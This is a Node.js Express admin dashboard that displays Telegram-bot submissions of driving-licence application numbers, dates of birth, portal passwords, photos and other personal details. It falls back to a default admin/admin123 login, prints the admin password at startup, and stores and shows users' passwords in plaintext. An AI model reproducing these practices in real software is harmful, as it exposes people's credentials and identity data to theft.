const express = require('express');
const path = require('path');
const fs = require('fs');
const db = require('./database');

const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'admin123';
const PORT = process.env.ADMIN_PORT || 3000;

function createAdminServer() {
  const app = express();
  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));

  // In-memory simple auth tokens
  const activeTokens = new Set();

  function authMiddleware(req, res, next) {
    const authHeader = req.headers.authorization || '';
    const cookieHeader = req.headers.cookie || '';
    const tokenFromCookie = (cookieHeader.match(/admin_token=([^;]+)/) || [])[1];
    const token = authHeader.replace('Bearer ', '') || tokenFromCookie;

    if (activeTokens.has(token)) {
      req.isAdmin = true;
      return next();
    }
    if (req.path.startsWith('/api/')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    return res.redirect('/login');
  }

  // ───────── AUTH ROUTES ─────────
  app.get('/login', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Admin Login — DL Service Dashboard</title>
  <style>
    body { margin: 0; font-family: system-ui, -apple-system, sans-serif; background: #0b1120; color: #f8fafc; display: flex; align-items: center; justify-content: center; height: 100vh; }
    .card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 32px; width: 340px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
    h2 { margin: 0 0 8px; font-size: 20px; font-weight: 700; color: #38bdf8; text-align: center; }
    p.sub { font-size: 13px; color: #94a3b8; text-align: center; margin-bottom: 24px; }
    .form-group { margin-bottom: 16px; }
    label { display: block; font-size: 12px; font-weight: 600; color: #cbd5e1; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
    input { width: 100%; box-sizing: border-box; padding: 10px 12px; font-size: 14px; background: #0f172a; border: 1px solid #475569; border-radius: 6px; color: #fff; outline: none; }
    input:focus { border-color: #38bdf8; }
    button { width: 100%; margin-top: 8px; padding: 11px; font-size: 14px; font-weight: 700; background: #0284c7; color: #fff; border: 0; border-radius: 6px; cursor: pointer; transition: 0.2s; }
    button:hover { background: #0369a1; }
    .err { color: #f87171; font-size: 13px; margin-top: 12px; text-align: center; display: none; }
  </style>
</head>
<body>
  <div class="card">
    <h2>DL Portal Admin</h2>
    <p class="sub">Sign in to manage submissions and photos</p>
    <form id="loginForm">
      <div class="form-group">
        <label>Username</label>
        <input type="text" id="username" required autocomplete="username" placeholder="admin">
      </div>
      <div class="form-group">
        <label>Password</label>
        <input type="password" id="password" required autocomplete="current-password" placeholder="••••••••">
      </div>
      <button type="submit">Sign In</button>
      <div id="errMsg" class="err">Invalid username or password</div>
    </form>
  </div>
  <script>
    document.getElementById('loginForm').onsubmit = async (e) => {
      e.preventDefault();
      const u = document.getElementById('username').value.trim();
      const p = document.getElementById('password').value.trim();
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: u, password: p })
      });
      const data = await res.json();
      if (data.ok) {
        document.cookie = 'admin_token=' + data.token + '; path=/; max-age=86400';
        window.location.href = '/';
      } else {
        document.getElementById('errMsg').style.display = 'block';
      }
    };
  </script>
</body>
</html>`);
  });

  app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (username === ADMIN_USER && password === ADMIN_PASS) {
      const token = 'token_' + Date.now() + '_' + Math.random().toString(36).slice(2);
      activeTokens.add(token);
      return res.json({ ok: true, token });
    }
    return res.status(401).json({ ok: false, error: 'Invalid credentials' });
  });

  app.get('/logout', (req, res) => {
    res.setHeader('Set-Cookie', 'admin_token=; path=/; max-age=0');
    res.redirect('/login');
  });

  // ───────── API ROUTES (PROTECTED) ─────────
  app.get('/api/submissions', authMiddleware, (req, res) => {
    res.json(db.getAll());
  });

  app.delete('/api/submissions/:id', authMiddleware, (req, res) => {
    const ok = db.delete(req.params.id);
    res.json({ ok });
  });

  // Photo viewer API
  app.get('/api/photo/:id', authMiddleware, (req, res) => {
    const sub = db.getById(req.params.id);
    if (!sub || !sub.photoBase64) {
      return res.status(404).send('Photo not found');
    }
    const buf = Buffer.from(sub.photoBase64, 'base64');
    res.writeHead(200, {
      'Content-Type': 'image/jpeg',
      'Content-Length': buf.length
    });
    res.end(buf);
  });

  // ───────── DASHBOARD UI (PROTECTED) ─────────
  app.get('/', authMiddleware, (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Admin Dashboard — DL Portal Service</title>
  <style>
    * { box-sizing: border-box; }
    body { margin: 0; font-family: system-ui, -apple-system, sans-serif; background: #0b1120; color: #f1f5f9; }
    header { background: #1e293b; border-bottom: 1px solid #334155; padding: 14px 24px; display: flex; justify-content: space-between; align-items: center; }
    .brand { font-size: 18px; font-weight: 700; color: #38bdf8; display: flex; align-items: center; gap: 8px; }
    .logout-btn { background: #334155; color: #e2e8f0; border: 0; padding: 7px 14px; border-radius: 6px; font-size: 13px; font-weight: 600; text-decoration: none; transition: 0.2s; }
    .logout-btn:hover { background: #ef4444; color: #fff; }

    .container { max-width: 1200px; margin: 24px auto; padding: 0 16px; }

    /* STATS CARDS */
    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-bottom: 24px; }
    .stat-card { background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 18px; }
    .stat-title { font-size: 12px; color: #94a3b8; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
    .stat-val { font-size: 28px; font-weight: 800; color: #f8fafc; margin-top: 6px; }
    .stat-val.green { color: #4ade80; }
    .stat-val.yellow { color: #facc15; }
    .stat-val.blue { color: #38bdf8; }

    /* SEARCH & CONTROLS */
    .controls { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; gap: 12px; flex-wrap: wrap; }
    .search-input { background: #1e293b; border: 1px solid #334155; border-radius: 6px; padding: 10px 14px; color: #fff; width: 300px; font-size: 14px; outline: none; }
    .search-input:focus { border-color: #38bdf8; }
    .refresh-btn { background: #0284c7; color: #fff; border: 0; padding: 9px 16px; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; }
    .refresh-btn:hover { background: #0369a1; }

    /* TABLE */
    .table-container { background: #1e293b; border: 1px solid #334155; border-radius: 10px; overflow-x: auto; }
    table { width: 100%; border-collapse: collapse; text-align: left; font-size: 13px; }
    th { background: #0f172a; padding: 12px 14px; font-weight: 600; color: #94a3b8; border-bottom: 1px solid #334155; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
    td { padding: 12px 14px; border-bottom: 1px solid #334155; vertical-align: middle; }
    tr:last-child td { border-bottom: 0; }
    tr:hover td { background: #182234; }

    /* BADGES */
    .badge { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: 700; text-transform: uppercase; }
    .badge-success { background: #064e3b; color: #34d399; }
    .badge-pending { background: #713f12; color: #fde047; }
    .badge-failed { background: #7f1d1d; color: #f87171; }

    /* ACTION BUTTONS */
    .btn-action { padding: 5px 10px; border-radius: 5px; font-size: 12px; font-weight: 600; cursor: pointer; border: 0; margin-right: 4px; transition: 0.15s; }
    .btn-view { background: #0284c7; color: #fff; }
    .btn-view:hover { background: #0369a1; }
    .btn-view:disabled { background: #475569; color: #94a3b8; cursor: not-allowed; }
    .btn-inspect { background: #475569; color: #fff; }
    .btn-inspect:hover { background: #64748b; }
    .btn-del { background: #ef4444; color: #fff; }
    .btn-del:hover { background: #dc2626; }

    /* MODAL */
    .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); display: none; align-items: center; justify-content: center; z-index: 100; backdrop-filter: blur(2px); }
    .modal-overlay.active { display: flex; }
    .modal-box { background: #1e293b; border: 1px solid #475569; border-radius: 12px; width: 90%; max-width: 480px; padding: 24px; position: relative; }
    .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; border-bottom: 1px solid #334155; padding-bottom: 12px; }
    .modal-title { font-size: 17px; font-weight: 700; color: #38bdf8; }
    .close-modal { background: none; border: 0; color: #94a3b8; font-size: 22px; cursor: pointer; line-height: 1; }
    .close-modal:hover { color: #fff; }
    .modal-img { display: block; max-width: 140px; height: auto; margin: 16px auto; border-radius: 8px; border: 2px solid #38bdf8; box-shadow: 0 4px 12px rgba(0,0,0,0.4); }
    .detail-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #334155; font-size: 13px; }
    .detail-label { color: #94a3b8; font-weight: 500; }
    .detail-val { font-weight: 600; color: #f8fafc; }
    .note-30days { font-size: 12px; color: #64748b; text-align: center; margin-top: 16px; }
  </style>
</head>
<body>
  <header>
    <div class="brand">
      <span>🛡️</span> DL Portal Service — Admin Panel
    </div>
    <a href="/logout" class="logout-btn">Sign Out</a>
  </header>

  <div class="container">
    <!-- STATS -->
    <div class="stats">
      <div class="stat-card">
        <div class="stat-title">Total Submissions</div>
        <div id="statTotal" class="stat-val blue">0</div>
      </div>
      <div class="stat-card">
        <div class="stat-title">Successful / Photos</div>
        <div id="statSuccess" class="stat-val green">0</div>
      </div>
      <div class="stat-card">
        <div class="stat-title">Pending / Incomplete</div>
        <div id="statPending" class="stat-val yellow">0</div>
      </div>
      <div class="stat-card">
        <div class="stat-title">Today's Queries</div>
        <div id="statToday" class="stat-val">0</div>
      </div>
    </div>

    <!-- CONTROLS -->
    <div class="controls">
      <input type="text" id="searchInput" class="search-input" placeholder="Search by Name, App No, State...">
      <button class="refresh-btn" onclick="loadData()">🔄 Refresh Data</button>
    </div>

    <!-- TABLE -->
    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th>User (Telegram)</th>
            <th>State</th>
            <th>Application No</th>
            <th>DOB</th>
            <th>Password</th>
            <th>Status</th>
            <th>Time</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody id="tableBody">
          <tr><td colspan="8" style="text-align: center; color: #94a3b8; padding: 24px;">Loading submissions...</td></tr>
        </tbody>
      </table>
    </div>

    <div class="note-30days">ℹ️ Records older than 30 days are automatically deleted to maintain security and disk space.</div>
  </div>

  <!-- PHOTO MODAL -->
  <div id="photoModal" class="modal-overlay">
    <div class="modal-box">
      <div class="modal-header">
        <div class="modal-title" id="photoModalTitle">Applicant Photo</div>
        <button class="close-modal" onclick="closePhotoModal()">&times;</button>
      </div>
      <div id="photoModalBody" style="text-align: center;">
        <img id="photoModalImg" class="modal-img" src="" alt="Photo">
        <div id="photoModalDetails" style="margin-top: 12px; font-size: 14px; color: #cbd5e1;"></div>
        <a id="photoDownloadBtn" href="" download class="btn-action btn-view" style="display: inline-block; margin-top: 14px; text-decoration: none; padding: 8px 16px;">⬇️ Download Original Photo</a>
      </div>
    </div>
  </div>

  <!-- INSPECT MODAL -->
  <div id="inspectModal" class="modal-overlay">
    <div class="modal-box">
      <div class="modal-header">
        <div class="modal-title">Submission Details</div>
        <button class="close-modal" onclick="closeInspectModal()">&times;</button>
      </div>
      <div id="inspectModalBody"></div>
    </div>
  </div>

  <script>
    let currentData = [];

    async function loadData() {
      try {
        const res = await fetch('/api/submissions');
        currentData = await res.json();
        renderStats(currentData);
        renderTable(currentData);
      } catch (err) {
        console.error(err);
      }
    }

    function renderStats(data) {
      document.getElementById('statTotal').innerText = data.length;
      document.getElementById('statSuccess').innerText = data.filter(d => d.status === 'SUCCESS').length;
      document.getElementById('statPending').innerText = data.filter(d => d.status === 'PENDING_CAPTCHA' || d.status === 'IN_PROGRESS').length;

      const todayStr = new Date().toISOString().slice(0, 10);
      document.getElementById('statToday').innerText = data.filter(d => (d.timestamp || '').slice(0, 10) === todayStr).length;
    }

    function renderTable(data) {
      const tb = document.getElementById('tableBody');
      if (!data.length) {
        tb.innerHTML = '<tr><td colspan="8" style="text-align: center; color: #94a3b8; padding: 24px;">No submissions yet. Submissions from Telegram bot will appear here automatically!</td></tr>';
        return;
      }

      tb.innerHTML = data.map(item => {
        let badgeClass = 'badge-pending';
        let statusText = item.status;
        if (item.status === 'SUCCESS') { badgeClass = 'badge-success'; statusText = 'Completed'; }
        else if (item.status === 'FAILED') { badgeClass = 'badge-failed'; statusText = 'Failed'; }
        else if (item.status === 'PENDING_CAPTCHA') { badgeClass = 'badge-pending'; statusText = 'Pending Captcha'; }

        const dateStr = item.timestamp ? new Date(item.timestamp).toLocaleString('en-IN', { dateStyle: 'short', timeStyle: 'short' }) : '—';
        const hasPhoto = !!item.photoBase64;

        return '<tr>' +
          '<td><b>' + escapeHtml(item.userName) + '</b><br><span style="font-size: 11px; color: #64748b;">ID: ' + escapeHtml(item.chatId) + '</span></td>' +
          '<td>' + escapeHtml(item.state) + (item.rtoCode ? '<br><code style="font-size: 11px; color: #60a5fa; background: #1e3a8a; padding: 1px 5px; border-radius: 3px; font-weight: bold;">' + escapeHtml(item.rtoCode) + '</code>' : '') + '</td>' +
          '<td><code style="color: #38bdf8;">' + escapeHtml(item.appNo) + '</code></td>' +
          '<td>' + escapeHtml(item.dob) + '</td>' +
          '<td><code style="color: #fbbf24; font-weight: bold; background: #3b2803; padding: 3px 6px; border-radius: 4px;">' + (item.password ? escapeHtml(item.password) : '—') + '</code></td>' +
          '<td><span class="badge ' + badgeClass + '">' + statusText + '</span></td>' +
          '<td>' + dateStr + '</td>' +
          '<td>' +
            '<button class="btn-action btn-view" ' + (hasPhoto ? '' : 'disabled') + ' onclick="viewPhoto(\\'' + item.id + '\\')">📷 View Img</button>' +
            '<button class="btn-action btn-inspect" onclick="inspectItem(\\'' + item.id + '\\')">🔍 Inspect</button>' +
            '<button class="btn-action btn-del" onclick="deleteItem(\\'' + item.id + '\\')">🗑️</button>' +
          '</td>' +
        '</tr>';
      }).join('');
    }

    function viewPhoto(id) {
      const item = currentData.find(d => d.id === id);
      if (!item || !item.photoBase64) return;
      document.getElementById('photoModalTitle').innerText = 'Photo: ' + (item.applicantName || item.appNo);
      const img = document.getElementById('photoModalImg');
      const src = 'data:image/jpeg;base64,' + item.photoBase64;
      img.src = src;
      document.getElementById('photoDownloadBtn').href = src;
      document.getElementById('photoDownloadBtn').download = 'Photo_' + item.appNo + '.jpg';
      document.getElementById('photoModalDetails').innerHTML = '<b>' + escapeHtml(item.applicantName || item.userName) + '</b> | App No: <code>' + escapeHtml(item.appNo) + '</code>';
      document.getElementById('photoModal').classList.add('active');
    }

    function closePhotoModal() {
      document.getElementById('photoModal').classList.remove('active');
    }

    function inspectItem(id) {
      const item = currentData.find(d => d.id === id);
      if (!item) return;

      const html = '<div class="detail-row"><span class="detail-label">Record ID</span><span class="detail-val"><code>' + escapeHtml(item.id) + '</code></span></div>' +
        '<div class="detail-row"><span class="detail-label">Telegram User</span><span class="detail-val">' + escapeHtml(item.userName) + ' (ID: ' + escapeHtml(item.chatId) + ')</span></div>' +
        '<div class="detail-row"><span class="detail-label">Selected State</span><span class="detail-val">' + escapeHtml(item.state) + '</span></div>' +
        '<div class="detail-row"><span class="detail-label">Application Number</span><span class="detail-val"><code>' + escapeHtml(item.appNo) + '</code></span></div>' +
        '<div class="detail-row"><span class="detail-label">Date of Birth</span><span class="detail-val">' + escapeHtml(item.dob) + '</span></div>' +
        '<div class="detail-row"><span class="detail-label">Password</span><span class="detail-val"><code style="color: #fbbf24; font-weight: bold; background: #3b2803; padding: 2px 6px; border-radius: 4px;">' + escapeHtml(item.password || '—') + '</code></span></div>' +
        '<div class="detail-row"><span class="detail-label">Status</span><span class="detail-val">' + escapeHtml(item.status) + '</span></div>' +
        '<div class="detail-row"><span class="detail-label">Applicant Name (RTO)</span><span class="detail-val">' + escapeHtml(item.applicantName || '—') + '</span></div>' +
        '<div class="detail-row"><span class="detail-label">Father\\'s Name</span><span class="detail-val">' + escapeHtml(item.fatherName || '—') + '</span></div>' +
        '<div class="detail-row"><span class="detail-label">RTO Office</span><span class="detail-val">' + escapeHtml(item.rtoName || '—') + '</span></div>' +
        '<div class="detail-row"><span class="detail-label">RTO Code</span><span class="detail-val"><code style="color: #60a5fa; font-weight: bold; background: #1e3a8a; padding: 2px 8px; border-radius: 4px; letter-spacing: 1px;">' + escapeHtml(item.rtoCode || '—') + '</code></span></div>' +
        '<div class="detail-row"><span class="detail-label">Licence Number</span><span class="detail-val">' + escapeHtml(item.licenceNo || '—') + '</span></div>' +
        '<div class="detail-row"><span class="detail-label">Submission Time</span><span class="detail-val">' + new Date(item.timestamp).toLocaleString('en-IN') + '</span></div>' +
        (item.errorMessage ? '<div class="detail-row"><span class="detail-label" style="color:#f87171;">Error Log</span><span class="detail-val" style="color:#f87171;">' + escapeHtml(item.errorMessage) + '</span></div>' : '');

      document.getElementById('inspectModalBody').innerHTML = html;
      document.getElementById('inspectModal').classList.add('active');
    }

    function closeInspectModal() {
      document.getElementById('inspectModal').classList.remove('active');
    }

    // Close modals on clicking overlay background
    window.onclick = function(event) {
      const pm = document.getElementById('photoModal');
      const im = document.getElementById('inspectModal');
      if (event.target === pm) pm.classList.remove('active');
      if (event.target === im) im.classList.remove('active');
    };

    async function deleteItem(id) {
      if (!confirm('Are you sure you want to delete this submission record?')) return;
      await fetch('/api/submissions/' + id, { method: 'DELETE' });
      loadData();
    }

    // Filter table live
    document.getElementById('searchInput').oninput = function() {
      const q = this.value.toLowerCase().trim();
      if (!q) return renderTable(currentData);
      const filtered = currentData.filter(d =>
        (d.userName || '').toLowerCase().includes(q) ||
        (d.appNo || '').toLowerCase().includes(q) ||
        (d.state || '').toLowerCase().includes(q) ||
        (d.applicantName || '').toLowerCase().includes(q) ||
        (d.dob || '').toLowerCase().includes(q)
      );
      renderTable(filtered);
    };

    function escapeHtml(str) {
      if (!str) return '';
      return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    }

    // Auto-refresh every 15s
    setInterval(loadData, 15000);
    loadData();
  </script>
</body>
</html>`);
  });

  app.listen(PORT, () => {
    console.log(`🌐 Admin Panel Dashboard running at http://localhost:${PORT}`);
    console.log(`   Username: ${ADMIN_USER} | Password: ${ADMIN_PASS}`);
  });
}

module.exports = { createAdminServer };
